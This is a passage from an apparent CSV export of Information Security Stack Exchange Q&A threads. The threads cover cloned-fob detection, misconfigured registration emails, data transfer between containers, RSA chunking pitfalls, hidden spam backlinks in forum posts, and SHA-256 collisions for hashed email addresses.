","3","3","267399","<p>If the fob can be written by the readers a sufficiently complex system can use cookies to learn that there are now three tokens claiming the same ID.</p>
","-1"
"267397","267397","Can a security system detect there are multiple copies of a single-issued fob?","<p>My building gave me a single fob. I made 3 copies of it for my family and they all opened the building entrance but not my actual apartment door, until one day the building told me they had noticed I had made copies of the fobs which was not allowed. They gave me a new fob and all previous fobs stopped working. How did they find out? And why did the copies not open my apartment door? It's one of those droplet-shaped thin fobs.</p>
","3","3","267400","<p>Yes, this is possible.  If the fob contains a counter which is incremented on each request, it's possible to detect that a copy has been made.</p>
<p>For example, say the original fob's counter is 5, and a copy is made.  The original fob is used again twice, and each time the counter is incremented so that it's now 7.  If the copy is used, its counter will be 6, which is less, which indicates that either the fob has been copied or an attacker is attempting to replay an earlier message.</p>
<p>Using a counter like this in conjunction with a suitable MAC, AEAD, or digital signature can be used to prevent replay attacks.  This is valuable because it prevents someone from loitering outside your apartment building, recording the data sent by the fob, and then later on using it to open the building or your apartment.  Of course, it also prevents you from copying the fob unnoticed.</p>
<p>Other implementations more complex than a counter can also be used as well.</p>
","-1"
"267397","267397","Can a security system detect there are multiple copies of a single-issued fob?","<p>My building gave me a single fob. I made 3 copies of it for my family and they all opened the building entrance but not my actual apartment door, until one day the building told me they had noticed I had made copies of the fobs which was not allowed. They gave me a new fob and all previous fobs stopped working. How did they find out? And why did the copies not open my apartment door? It's one of those droplet-shaped thin fobs.</p>
","3","3","267406","<p>There have been different methods of detecting cloned RFID fobs developed over the years depending on the complexity of the system:</p>
<ul>
<li><a href=""https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0193951"" rel=""nofollow noreferrer"">a random number</a> added to the fob that gets changed with every successful authentication - a cloned (or original) tag will not get updated with the new random number after first use</li>
<li>the tracking of the combination of a <a href=""https://www.rfidjournal.com/question/can-every-rfid-card-be-copied-or-cloned"" rel=""nofollow noreferrer"">TagID and RFID chip serial number</a> (which cannot be changed)</li>
<li>or simple access pattern anomaly detection (e.g. fob used to enter twice without an exit event in the logs, etc.)</li>
</ul>
<p>All of these located with the Google search: &quot;how to detect a cloned rfid fob&quot;</p>
<p>Without more information, it is not possible to determine why some doors worked and some didn't. In the past, some outside access doors were not hooked up to the authentication system, but merely looked for a compatible key (a key made by the same manufacturer as the reader).</p>
","4"
"267390","267390","""Undelivered Mail"" I never sent (after registration on website)","<p>I created an online account and received the usual welcome email. In addition, however, an &quot;Undelivered Mail Returned to Sender&quot; email appeared in my inbox one second later. I am the supposed sender, and the website I registered on the recipient. The email which could not be delivered contains (in plain text as well as in a .csv attachment) all the information I had entered upon registration. The website itself seems trustworthy/legitimate.</p>
<p>Since I definitely did not send an email (and do not see an email in my outbox or sent folder), I wonder how this is possible and whether this poses a security risk.</p>
<p>I found a related question here on this site (
<a href=""https://security.stackexchange.com/questions/237769/i-received-an-undelivered-mail-is-my-email-address-used-maliciously"">i-received-an-undelivered-mail-is-my-email-address-used-maliciously</a>), but I can't quite connect the dots.</p>
<ul>
<li>It seems unlikely to me that my email was hacked or maliciously used at exactly that point of time. The password I used on the website was randomly generated and is almost surely unique among all my passwords.</li>
<li>If the header was forged and someone was trying to deceive me that I had sent an email, I'd wonder why the email and attachments contained the information I entered upon account creation. If that was a third party, would this mean the website could be compromised? Again, the timing make me wonder if this is realistic.</li>
<li>If it was a poorly configured foreign server, why would it appear as if I had tried to send an email with that specific content. The information, as far as I understand, should have been submitted/sent through the registration form. Why send another email with the same information? Why would it appear as if the email was sent from my email address?</li>
</ul>
<p>I would appreciate if someone could shed some more light on this. Please find part of the email header (with my and the website's info anonymized) below. Please excuse the use of an image, but otherwise this post was classified as spam.</p>
<p><a href=""https://i.stack.imgur.com/d2Zot.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/d2Zot.jpg"" alt=""enter image description here"" /></a></p>
<p>I also found <a href=""https://security.stackexchange.com/questions/211005/failed-to-send-emails-that-i-never-sent"">failed-to-send-emails-that-i-never-sent</a>, but the context is quite different to mine. In my case, the undeliverable email seems to be specifically related the the registration on the website.</p>
","16","3","267393","<p>It looks like the web service in question has configured their system to forward the welcome emails to an internal address on their end, but misconfigured their system such that the <code>From:</code> line is the customer's address rather than some internal address that they control. Intentional or not, they also fail to consider <a href=""https://support.google.com/a/answer/2466580"" rel=""noreferrer"">DMARC</a>, so customers wind up with sketchy-looking emails like this about the website trying to email on their behalf from an unauthorized host.</p>
<p>You could help the service out by letting them know about the configuration issue, but ultimately things are working as they ought to as far as your email setup is concerned, so you are safe to just brush this off without consequence too. There does not appear to be any malicious intent, but the way the emails are sent with whatever PII it had is not exactly commendable.</p>
<p>As for why they would do this, I'm imagining that they have a weirdly tacked-together process for taking information from their registration form and delivering it to another service via SMTP since there was a CSV attached. As long as the receiving address was controlled by them, my best guess is that they're handling registrations in a frustratingly unsafe, roundabout, and kludgy way for purposes of logging, debugging, &quot;backups,&quot; or—shudder to think—processing.</p>
<p>I'm also going to speculate that their Fiverr dev(s) received little oversight when stringing this together. In reality, though, this could just be that some developer had set this up as a meantime debugging measure and failed to disable it in production before anyone noticed. I'd email them.</p>
","30"
"267390","267390","""Undelivered Mail"" I never sent (after registration on website)","<p>I created an online account and received the usual welcome email. In addition, however, an &quot;Undelivered Mail Returned to Sender&quot; email appeared in my inbox one second later. I am the supposed sender, and the website I registered on the recipient. The email which could not be delivered contains (in plain text as well as in a .csv attachment) all the information I had entered upon registration. The website itself seems trustworthy/legitimate.</p>
<p>Since I definitely did not send an email (and do not see an email in my outbox or sent folder), I wonder how this is possible and whether this poses a security risk.</p>
<p>I found a related question here on this site (
<a href=""https://security.stackexchange.com/questions/237769/i-received-an-undelivered-mail-is-my-email-address-used-maliciously"">i-received-an-undelivered-mail-is-my-email-address-used-maliciously</a>), but I can't quite connect the dots.</p>
<ul>
<li>It seems unlikely to me that my email was hacked or maliciously used at exactly that point of time. The password I used on the website was randomly generated and is almost surely unique among all my passwords.</li>
<li>If the header was forged and someone was trying to deceive me that I had sent an email, I'd wonder why the email and attachments contained the information I entered upon account creation. If that was a third party, would this mean the website could be compromised? Again, the timing make me wonder if this is realistic.</li>
<li>If it was a poorly configured foreign server, why would it appear as if I had tried to send an email with that specific content. The information, as far as I understand, should have been submitted/sent through the registration form. Why send another email with the same information? Why would it appear as if the email was sent from my email address?</li>
</ul>
<p>I would appreciate if someone could shed some more light on this. Please find part of the email header (with my and the website's info anonymized) below. Please excuse the use of an image, but otherwise this post was classified as spam.</p>
<p><a href=""https://i.stack.imgur.com/d2Zot.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/d2Zot.jpg"" alt=""enter image description here"" /></a></p>
<p>I also found <a href=""https://security.stackexchange.com/questions/211005/failed-to-send-emails-that-i-never-sent"">failed-to-send-emails-that-i-never-sent</a>, but the context is quite different to mine. In my case, the undeliverable email seems to be specifically related the the registration on the website.</p>
","16","3","267401","<p>It used to be a fairly common practice to forge the sender on some internal emails so that the admin can easily add your address to their address book.</p>
<p>such practice runs foul of DKIM, VERP, and SPF protections so the recipient must whitelist the web server if they have any forgery prevention measures on their mailbox server.</p>
<p>In this example it gets rejected by gmail.</p>
<p>To fix this <code>__WEBSITE_EMAIL__</code> needs to whitelist their own server in their G-suite account or shift their MX  and mailbox (or signup conversion email account) to a different provider and whitelist it there.</p>
<p>The easiest fix is probably to stop using SMTP for this path and instead set up a POP3 or IMAP account on <code>__DOMAIN_OF_WEBSITE__</code> and have their gmail account pull the emails instead of pushing them using SMTP.</p>
","5"
"267390","267390","""Undelivered Mail"" I never sent (after registration on website)","<p>I created an online account and received the usual welcome email. In addition, however, an &quot;Undelivered Mail Returned to Sender&quot; email appeared in my inbox one second later. I am the supposed sender, and the website I registered on the recipient. The email which could not be delivered contains (in plain text as well as in a .csv attachment) all the information I had entered upon registration. The website itself seems trustworthy/legitimate.</p>
<p>Since I definitely did not send an email (and do not see an email in my outbox or sent folder), I wonder how this is possible and whether this poses a security risk.</p>
<p>I found a related question here on this site (
<a href=""https://security.stackexchange.com/questions/237769/i-received-an-undelivered-mail-is-my-email-address-used-maliciously"">i-received-an-undelivered-mail-is-my-email-address-used-maliciously</a>), but I can't quite connect the dots.</p>
<ul>
<li>It seems unlikely to me that my email was hacked or maliciously used at exactly that point of time. The password I used on the website was randomly generated and is almost surely unique among all my passwords.</li>
<li>If the header was forged and someone was trying to deceive me that I had sent an email, I'd wonder why the email and attachments contained the information I entered upon account creation. If that was a third party, would this mean the website could be compromised? Again, the timing make me wonder if this is realistic.</li>
<li>If it was a poorly configured foreign server, why would it appear as if I had tried to send an email with that specific content. The information, as far as I understand, should have been submitted/sent through the registration form. Why send another email with the same information? Why would it appear as if the email was sent from my email address?</li>
</ul>
<p>I would appreciate if someone could shed some more light on this. Please find part of the email header (with my and the website's info anonymized) below. Please excuse the use of an image, but otherwise this post was classified as spam.</p>
<p><a href=""https://i.stack.imgur.com/d2Zot.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/d2Zot.jpg"" alt=""enter image description here"" /></a></p>
<p>I also found <a href=""https://security.stackexchange.com/questions/211005/failed-to-send-emails-that-i-never-sent"">failed-to-send-emails-that-i-never-sent</a>, but the context is quite different to mine. In my case, the undeliverable email seems to be specifically related the the registration on the website.</p>
","16","3","267425","<p>One very specific, but possibly common reason is this: The mail is sent by some software, like the popular Wordpress Contact Form 7 plugin, which allows to configure to and from fields in a GUI, but doesn't have the same comfort for the &quot;reply-to&quot; field. Now someone who might not even know what the &quot;reply-to&quot; field is configures the mails such that hitting reply will send an e-mail to the person who filled out the form. Then if there is a problem with the &quot;to&quot; adress, the mails will bounce to the wrong adress.</p>
<p>If you do this correctly with the &quot;reply-to&quot; field it can be a fairly practical workflow even today: You might want to download aggregate form-data from somewhere periodically or handle the data automatically, but this still notifies you when there is new data (especially in the case of infrequently used forms) and in many cases there is a subset of form entries which you might want to answer by mail (usually because there is a free text comment field in the form) and that way you can do so very easily.</p>
","2"
"267371","267371","What is the most secure way to transfer untrusted data between containers?","<p>Let's suppose we have two containers running on a linux box and one has untrusted user data that the other needs to process. What is the most secure way to transfer this data? Is it better to write the data to a shared volume, or send it over the network, or...?</p>
","0","3","267372","<p>It looks like your focus is on making sure that the transfer of untrusted data does not harm the system, and not on preventing others to access the data.</p>
<p>Untrusted data are not a problem if they are only treated as binary objects. The problems instead happen if the data are treated as more than just a sequence of bytes, i.e. if they are interpreted or executed. Therefore the most secure method to transfer these data is to make sure that any parties involved in the transfer will treat the data only as a sequence of bytes without deeper interpretation or execution.</p>
<p>This can be achieved by A) limiting who can access the data and B) making sure that the access is secure (i.e. treated as byte sequence only). A point-to-point transfer like a network connection between producer and consumer of data limits the access to only these parties, so only these needs to be checked for B.
When sharing the data with a file system or database there might be more processes involved which access the data (depending on the setup), which also means that more processes need to be checked to handle the data in a secure way.</p>
","1"
"267371","267371","What is the most secure way to transfer untrusted data between containers?","<p>Let's suppose we have two containers running on a linux box and one has untrusted user data that the other needs to process. What is the most secure way to transfer this data? Is it better to write the data to a shared volume, or send it over the network, or...?</p>
","0","3","267375","<p>The answer depends on what you mean by <em>secure</em>.</p>
<p>If the data are a text in some form (plain text, JSON, XML, YAML, HTML, JavaScript) and by <em>secure</em> you mean preventing <strong>cross-site-scripting</strong> it should be safe to display these data:</p>
<ul>
<li>The receiving container should validate if these data contain any script and refuse to accept it or sanitize such data, i.e. remove al pieces that look like code, e.g. remove JavaScript elements, HTML elements, etc.</li>
</ul>
<p>If the data are binary files like MS Word, MS Excel, PDF and by <em>secure</em> you mean preventing <strong>malicious documents</strong>:</p>
<ul>
<li>Check these files by an antivirus</li>
</ul>
<p>If the data are application code like .exe, .dll, .so, .sh, .jar and by <em>secure</em> you mean <strong>malicious executable code</strong>:</p>
<ul>
<li>Check these files by an antivirus</li>
</ul>
<p>Independent on the nature of data:</p>
<ul>
<li>The receiving container should have some restrictions for the size of data packages (maximal request size if you use network, maximal file size if you use shared volume). Otherwise it may lead to <strong>resource exhaustion</strong> attacks.</li>
<li>If not only the data contents represents risks, but also the sending container, then add also a limit for frequency of requests that the receiving container should accept to prevent <strong>resource exhaustion</strong> attacks.</li>
</ul>
","1"
"267371","267371","What is the most secure way to transfer untrusted data between containers?","<p>Let's suppose we have two containers running on a linux box and one has untrusted user data that the other needs to process. What is the most secure way to transfer this data? Is it better to write the data to a shared volume, or send it over the network, or...?</p>
","0","3","267403","<p>An important point in this is to realise that containers are essentially just processes running on a host.</p>
<p>Assuming you're using a solution that will always be single host (e.g. Docker with Docker compose), using something like a volume should be fine for most purposes. An attacker who gets privileged access to the host will be able to compromise both containers anyway, so there's no change in threat model by using a shared volume.</p>
<p>If you need more direct communications for your two applications, something like a UNIX socket shared between the two, could also be used, which avoids the need for having anything listening on the network.</p>
<p>All this gets more complex if you expect to ever have to run the two containers on different hosts (e.g. in a Kubernetes cluster) but for single host solutions, it's pretty straightfoward.</p>
","3"
"267347","267347","What makes chopping RSA payloads into constant size chunks unsafe?","<p>I am encrypting <strong>chat</strong> messages with RSA thus speed is no issue.</p>
<p>It was working fine before I tried transmitting a long message.
Now I need to cope with the fact RSA is block, instead of stream, based. Easy: chop the bytes into smaller packets.</p>
<p><a href=""https://security.stackexchange.com/a/33445/10990"">But <strong>no</strong>:</a></p>
<blockquote>
<p>[...]splitting the input message into 245-byte chunks and encrypting each of them more or less separately. This is a bad idea because:</p>
<ul>
<li>There can be substantial weaknesses in how the data is split and then rebuilt. There is no well-studied standard for that.[...]</li>
</ul>
<p>-- Thomas Pornin</p>
</blockquote>
<p>The project is only a hobby learning experience stuff. Still, I don't want to learn wrong.</p>
<p>How dangerous is it? What are some simple alternatives?</p>
","9","3","267351","<p>You would have a problem if you cut your 245 byte message into 16 bytes chunks and the last one gets encrypted as 5 bytes payload + 11 bytes of zeroes. Since there is only 40 bits of payload, these last five bytes might be decrypted using brute force. And that might be enough to cause damage.</p>
<p>You get around this by not adding 11 bytes of zeroes, but 11 random bytes.</p>
<p>Or you might have some repeated text or in general dependencies between your 16 byte chunks. So you don't want to just split your text up and encrypt each single chunk on its own, but encrypt the first chunk, then a combination of first and second chunk, and so on.</p>
<p>Of course even though speed is not a problem, it's always best to use a standardised solution, and that is to create a stream, create a key for it, and encrypt only the key with RSA, which is what everyone else does. It won't save you time, but it's safer because millions of users would have run into problems before you if there were any problems.</p>
","7"
"267347","267347","What makes chopping RSA payloads into constant size chunks unsafe?","<p>I am encrypting <strong>chat</strong> messages with RSA thus speed is no issue.</p>
<p>It was working fine before I tried transmitting a long message.
Now I need to cope with the fact RSA is block, instead of stream, based. Easy: chop the bytes into smaller packets.</p>
<p><a href=""https://security.stackexchange.com/a/33445/10990"">But <strong>no</strong>:</a></p>
<blockquote>
<p>[...]splitting the input message into 245-byte chunks and encrypting each of them more or less separately. This is a bad idea because:</p>
<ul>
<li>There can be substantial weaknesses in how the data is split and then rebuilt. There is no well-studied standard for that.[...]</li>
</ul>
<p>-- Thomas Pornin</p>
</blockquote>
<p>The project is only a hobby learning experience stuff. Still, I don't want to learn wrong.</p>
<p>How dangerous is it? What are some simple alternatives?</p>
","9","3","267355","<p>Gnasher729 points out the biggest problem with splitting everything into small packets... There is a 2nd problem with this technique, which is a bit more esoteric.</p>
<p>Encryption techniques can be put into 2 broad categories, substitution block ciphers, and mutating substitution block ciphers.
A substitution block cipher converts a meta character (1 to N bits of information where N is the block size of the cipher) to the same meta character <code>A -&gt; B</code> every single time, which is nice be cause it makes decrypting/encrypting the message fast, and parallelizable. But, it allows your message to be analyzed and broken using statistics + apriori knowledge about the message.</p>
<p>A mutating substitution block cipher is a block cipher that encrypts things differently as it goes thru the message by using some, hard to reverse engineer, saved state (a CPRNG, previous cyphertext etc...) so that your meta characters map differently in the throughout the message <code>A-&gt;B</code> then <code>A-&gt;C</code>. This makes your message much more secure because statistical analysis is far more difficult. The downside of course is that your message can only be decrypted/encrypted as a whole message. And poorly chosen mutating saved state can make the message less secure, ENIGMA is a good example of a poorly chosen mutating cipher... Which is why you shouldn't roll your own Crypto.</p>
<p>You could get around this particular weakness by generating a new RSA key for every single payload. But I don't recommend that.</p>
<p>Edit: Realized you wanted a recomendation, which this fails to provide... This is my recomendation.</p>
<p>Use RSA to establish a communication channel and then send a randomly generated key using RSA.</p>
<p>Use that randomly generated key to encrypt the message you want to send using a symmetric encryption algorithm, like AES GCM (do not use AES CBC, it is flawed).</p>
<p>This is relatively easy to implement.</p>
","4"
"267347","267347","What makes chopping RSA payloads into constant size chunks unsafe?","<p>I am encrypting <strong>chat</strong> messages with RSA thus speed is no issue.</p>
<p>It was working fine before I tried transmitting a long message.
Now I need to cope with the fact RSA is block, instead of stream, based. Easy: chop the bytes into smaller packets.</p>
<p><a href=""https://security.stackexchange.com/a/33445/10990"">But <strong>no</strong>:</a></p>
<blockquote>
<p>[...]splitting the input message into 245-byte chunks and encrypting each of them more or less separately. This is a bad idea because:</p>
<ul>
<li>There can be substantial weaknesses in how the data is split and then rebuilt. There is no well-studied standard for that.[...]</li>
</ul>
<p>-- Thomas Pornin</p>
</blockquote>
<p>The project is only a hobby learning experience stuff. Still, I don't want to learn wrong.</p>
<p>How dangerous is it? What are some simple alternatives?</p>
","9","3","267695","<blockquote>
<p>How dangerous is it?</p>
</blockquote>
<p>If the messages are too small, and you apply just RSA over them (without any padding schemes for RSA) then the message itself can be recovered (if it is small enough or the key is big enough) by applying lattice reduction algorithms. The theory is quite complex, you can read more about it <a href=""https://github.com/mimoo/RSA-and-LLL-attacks"" rel=""nofollow noreferrer"">here</a>, but the just of it is that RSA shouldn't be used all by itself and without any padding schemes such as OAEP.</p>
<blockquote>
<p>What are some simple alternatives?</p>
</blockquote>
<p>One simple scheme I see would be to use Diffie-Hellman (with or without Elliptic Curves, also, bear in mind that the key exchange needs to be resistant to <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">man in the middle attacks</a>) to generate shared symmetric keys and then use AES with a modern mode of operation, such as AES-EAX.</p>
<p>But since you said this is a hobby project for learning new things, I'd recommend using the above method, but substituting Diffe-Hellman with <a href=""https://pq-crystals.org/kyber/"" rel=""nofollow noreferrer"">Kyber</a>, it has been selected last year to become a <a href=""https://csrc.nist.gov/Projects/post-quantum-cryptography/selected-algorithms-2022"" rel=""nofollow noreferrer"">NIST standard</a>, meaning that in a few years it might become widely used.</p>
","1"
"267335","267335","What is the purpose of hiding spam links in some obscure forum posts?","<p>I'm moderating one small Discourse forum and we, like everyone else, get spammers from time to time. Our forum is small, like 40-60 weekly unique visitors. Our forum requires that each new user's first post must be reviewed by a moderator before it appears and this catches most of the spammers.</p>
<p>Recently we've been getting spammers posting to some older thread without contributing anything new, like writing: <code>&quot;Thank you. This solved my problem.&quot;</code> While posts like these are suspicious, a moderator can't block them outright because they aren't against any rules and they might be coming from a legit user who has just created an account in order to thank someone for helping them out.</p>
<p>Usually after their first post is published, the spammers come back a day or two later and they either make a new post or they edit their previous post to include &quot;hidden links&quot;, like:</p>
<p><code>Thank you[.](https://www.SomeRandomSpamURL.com/) This solved my problem[.](https://www.SomeOtherRandomSpamURL.com/) [.](https://www.EvenMoreRandomSpamURLs.com/))</code></p>
<p>I'm simply curious as to why would someone do this? I understand the purpose of regular spam links where the spammer tries to explicitly divert traffic to some site, but if the link is hidden behind a dot, then 99% of users likely won't ever realize there's a link to be clicked. If they do, then they'll likely realize it's a scam link. It's also not like someone could accidentally hit a dot on a forum post either.</p>
<p>What are these spammers trying to gain by creating these &quot;hidden&quot; spam links?</p>
","37","4","267337","<p>It could be an attempt to boost the spam sites in search engine results by creating <a href=""https://en.wikipedia.org/wiki/Backlink"" rel=""noreferrer"">backlinks</a> to it, which is a common SEO technique (although debatable how effective it is, as search engines can often detect this kind of dodgy behaviour).</p>
","55"
"267335","267335","What is the purpose of hiding spam links in some obscure forum posts?","<p>I'm moderating one small Discourse forum and we, like everyone else, get spammers from time to time. Our forum is small, like 40-60 weekly unique visitors. Our forum requires that each new user's first post must be reviewed by a moderator before it appears and this catches most of the spammers.</p>
<p>Recently we've been getting spammers posting to some older thread without contributing anything new, like writing: <code>&quot;Thank you. This solved my problem.&quot;</code> While posts like these are suspicious, a moderator can't block them outright because they aren't against any rules and they might be coming from a legit user who has just created an account in order to thank someone for helping them out.</p>
<p>Usually after their first post is published, the spammers come back a day or two later and they either make a new post or they edit their previous post to include &quot;hidden links&quot;, like:</p>
<p><code>Thank you[.](https://www.SomeRandomSpamURL.com/) This solved my problem[.](https://www.SomeOtherRandomSpamURL.com/) [.](https://www.EvenMoreRandomSpamURLs.com/))</code></p>
<p>I'm simply curious as to why would someone do this? I understand the purpose of regular spam links where the spammer tries to explicitly divert traffic to some site, but if the link is hidden behind a dot, then 99% of users likely won't ever realize there's a link to be clicked. If they do, then they'll likely realize it's a scam link. It's also not like someone could accidentally hit a dot on a forum post either.</p>
<p>What are these spammers trying to gain by creating these &quot;hidden&quot; spam links?</p>
","37","4","267349","<p>Spam and leaving links is a business nowadays. &quot;Companies&quot; (and I use this term in a very broad meaning) sometimes are getting paid if they leave the spam-url on different sites, and also by the number of days the link is present on the site. Say a few cents per day that the link is available on the site. Employers of those companies seldom look at the actual links, but automatically verify that the link is present.</p>
<p>If you can easily hide the URL in a way that it stays available for a longer time you get more cents. Of course, this is done automatically so the investment is low.</p>
<p>So, they may be scamming the spammers.</p>
","5"
"267335","267335","What is the purpose of hiding spam links in some obscure forum posts?","<p>I'm moderating one small Discourse forum and we, like everyone else, get spammers from time to time. Our forum is small, like 40-60 weekly unique visitors. Our forum requires that each new user's first post must be reviewed by a moderator before it appears and this catches most of the spammers.</p>
<p>Recently we've been getting spammers posting to some older thread without contributing anything new, like writing: <code>&quot;Thank you. This solved my problem.&quot;</code> While posts like these are suspicious, a moderator can't block them outright because they aren't against any rules and they might be coming from a legit user who has just created an account in order to thank someone for helping them out.</p>
<p>Usually after their first post is published, the spammers come back a day or two later and they either make a new post or they edit their previous post to include &quot;hidden links&quot;, like:</p>
<p><code>Thank you[.](https://www.SomeRandomSpamURL.com/) This solved my problem[.](https://www.SomeOtherRandomSpamURL.com/) [.](https://www.EvenMoreRandomSpamURLs.com/))</code></p>
<p>I'm simply curious as to why would someone do this? I understand the purpose of regular spam links where the spammer tries to explicitly divert traffic to some site, but if the link is hidden behind a dot, then 99% of users likely won't ever realize there's a link to be clicked. If they do, then they'll likely realize it's a scam link. It's also not like someone could accidentally hit a dot on a forum post either.</p>
<p>What are these spammers trying to gain by creating these &quot;hidden&quot; spam links?</p>
","37","4","267350","<p>It's all about search engine reputation, as discussed.</p>
<p>However, it's not going to work on your site. Because you are a conscientious forum operator, so of course you add <a href=""https://developers.google.com/search/docs/crawling-indexing/qualify-outbound-links"" rel=""noreferrer"">the meta tag &quot;rel=nofollow&quot;</a> on every URL link that comes from <em>user-generated content</em> aka UGC.  (There is also a &quot;rel=ugc&quot; tag but it may be a Google-only extension to the spec).  The spec has been around since the late 2000s (the decade).</p>
<p>If you don't use that tag, well, that paints a target on your back.</p>
<p>It can also help, if you are good at this, to rename at least one of the mandatory fields on the signup page, such as the &quot;repeat password&quot; field. These attacks are all scripted, of course; and they are counting on everyone using the stock UI provided by the forum software.  Human logins coming off your UI have the correctly renamed <code>repaet_passwrod</code> field; bot logins have the wrong (normal) field name, and are rejected for lack of the field. They're not going to send a human to investigate.</p>
","26"
"267335","267335","What is the purpose of hiding spam links in some obscure forum posts?","<p>I'm moderating one small Discourse forum and we, like everyone else, get spammers from time to time. Our forum is small, like 40-60 weekly unique visitors. Our forum requires that each new user's first post must be reviewed by a moderator before it appears and this catches most of the spammers.</p>
<p>Recently we've been getting spammers posting to some older thread without contributing anything new, like writing: <code>&quot;Thank you. This solved my problem.&quot;</code> While posts like these are suspicious, a moderator can't block them outright because they aren't against any rules and they might be coming from a legit user who has just created an account in order to thank someone for helping them out.</p>
<p>Usually after their first post is published, the spammers come back a day or two later and they either make a new post or they edit their previous post to include &quot;hidden links&quot;, like:</p>
<p><code>Thank you[.](https://www.SomeRandomSpamURL.com/) This solved my problem[.](https://www.SomeOtherRandomSpamURL.com/) [.](https://www.EvenMoreRandomSpamURLs.com/))</code></p>
<p>I'm simply curious as to why would someone do this? I understand the purpose of regular spam links where the spammer tries to explicitly divert traffic to some site, but if the link is hidden behind a dot, then 99% of users likely won't ever realize there's a link to be clicked. If they do, then they'll likely realize it's a scam link. It's also not like someone could accidentally hit a dot on a forum post either.</p>
<p>What are these spammers trying to gain by creating these &quot;hidden&quot; spam links?</p>
","37","4","267381","<p>In days gone by to get your site to the top of Google, those with a wonky moral compass would leave wikimedia wide open on the site.
Within a week, it would have GB of spam, links to which would be posted by an army of bots and sweat workers on many thousands of forums world wide.</p>
<p>Heavily linked to ==&gt; higher score. Then they delete that database and published their app. Redirection could be applied to the backlinks.</p>
<p>Google is wise to this, but it does still happen for legitimate content.</p>
","2"
"267332","267332","Are SHA-256 hashes of user emails guaranteed to be unique?","<p>I'm working on a website that will require users to insert a valid email address, which will work as their unique user id. This email will not be used for communicating with the user, it is only ever used to verify that a particular user id exists.</p>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security and my plan is to use SHA-256 with pepper to store all emails. In pseudo code, something like: <code>sha256( &quot;example@email.com&quot;, &quot;peppermintTea&quot; ) =&gt; &quot;62d989abbca458c2616acddfbf45a364037a70ebd941568c9ee8f5d923e38c4f&quot;</code></p>
<p>While reading up on SHA-256 and hashing emails, I've run into several different posts discussing the possibility of hash collisions. Some posters go to ridiculous lengths of saying &quot;it's more probably to be hit by an asteroid twice than it is for two files to have the same hash&quot;, but what about email addresses? Email addresses can be relatively short and I haven't been able to find any answer on whether or not it is possible for two hashed emails to return the same hash?</p>
<p>For argument sake, if there would be 5 billion email addresses in the world, is there a non-zero chance that two of these emails would return the same hash? If there is, then how should I prepare for these possible collisions?</p>
","5","5","267334","<p><strong>TLDR</strong></p>
<ol>
<li>No, there is no guarantee that hashes will be unique.</li>
<li>Despite hashing, emails can easily be restored, if contained in leaked databases.</li>
</ol>
<p><strong>Details</strong></p>
<p>In a big set of values <strong>collisions are unavoidable</strong> because of <a href=""https://en.wikipedia.org/wiki/Pigeonhole_principle"" rel=""nofollow noreferrer"">pigeonhole principle</a>.</p>
<p>Despite SHA-256 was designed in such way that the <strong>probability</strong> of collisions is very low, there is <strong>no guarantee</strong> that in any small set of email addresses there will be no collisions.</p>
<p>How can you guarantee the uniqueness? Ask users to pick up some login name and allow it only if it is not yet used, or generate a login name for them.</p>
<blockquote>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security</p>
</blockquote>
<p>This will not necessarily provide what you expect. Storing only hash of (user + password) will make it hard to analyze the cases when user cannot login. You will not know if the user entered a wrong password or a wrong email or both. You will not be able to check if particular user exists in your database at all. That's why you will need to store email without password.</p>
<p>Suppose you store a hash of the email without password. You can also use some salt, but it needs be global, because again you don't have further info like user ID, and cannot use separate salt for each user.</p>
<p>The attacker can take a relatively big spam database with emails and compute your hash function for every email in this database. Since SHA-256 is very quick, some GPUs can compute more than 10 000 000 hashes per second. Suppose this database contains 10 email addresses for every person in the world. Computing hashes for all of them will take just about 8 000 seconds, which is just about 2 hours. If the email is known in the spam database, the attacker will know that this user is registered at your web site. Thus, if you want to use emails and want to hash them, you may need a slower hash algorithm, for instance, PBKDF2 or Argon2, depending on what is available on your platform.</p>
<p>What can you do instead? If your goal is to prevent correlation of user accounts with leaked data from other web sites, you can <em>generate</em> a unique login name for every user during registration. For 8 billions users (current world population) just 7 English letters will be sufficient.</p>
","-1"
"267332","267332","Are SHA-256 hashes of user emails guaranteed to be unique?","<p>I'm working on a website that will require users to insert a valid email address, which will work as their unique user id. This email will not be used for communicating with the user, it is only ever used to verify that a particular user id exists.</p>
<p>I've read a lot about storing emails to a database and about how they should be hashed to improve security and my plan is to use SHA-256 with pepper to store all emails. In pseudo code, something like: <code>sha256( &quot;example@email.com&quot;, &quot;peppermintTea&quot; ) =&gt; &quot;62d989abbca458c2616acddfbf45a364037a70ebd941568c9ee8f5d923e38c4f&quot;</code></p>
<p>While reading up on SHA-256 and hashing emails, I've run into several different posts discussing the possibility of hash collisions. Some posters go to ridiculous lengths of saying &quot;it's more probably to be hit by an asteroid twice than it is for two files to have the same hash&quot;, but what about email addresses? Email addresses can be relatively short and I haven't been able to find any answer on whether or not it is possible for two hashed emails to return the same hash?</p>
<p>For argument sake, if there would be 5 billion email addresses in the world, is there a non-zero chance that two of these emails would return the same hash? If there is, then how should I prepare for these possible collisions?</p>
","5","5","267422","<p>The problem that you describe is known as the <a href=""https://en.wikipedia.org/wiki/Birthday_attack"" rel=""nofollow noreferrer"">Birthday Attack Problem</a>.</p>
<p>It is often posed by asking - if there are 23 people in a room, then what is the probability that any two of them have the same birthday?  As you can see in the page linked above, the math is based on the assumption that each of the N samples are distributed uniformly and at random over some space H.  In the example above, N is 23 for the number of people in the room, and H is 365 for the number of days in a year.  It turns out that in this case, there is a 50% chance that two of the 23 people have the same birthday.</p>
<p>Being that the hashed email addresses in your case would be distributed uniformly and at random over the space of the SHA256 hash function, the same math can be applied to your problem.  So, in your case H is 2^256 and N is 5 billion.  If you apply the math using the above inputs, you'll find that the probability of a collision (i.e. any two different user email addresses resulting the same SHA256 hash) is approximately 1 in 10^58.</p>
<p>So, while the SHA256 hashes of any two different user email addresses are not <em>guaranteed</em> to be unique - the likelihood of this happening is incredibly small.  10^58 is an astronomically large number.  To put this in perspective, the number of water molecules in the earth's oceans is 'only' ~10^46.  So, the chance of a collision in your case would be like tagging a molecule of water, throwing it in the ocean, then later randomly choosing a molecule of water from the ocean, and it being the same one that you tagged - then, repeating this over a trillion times consecutively, and then some.</p>
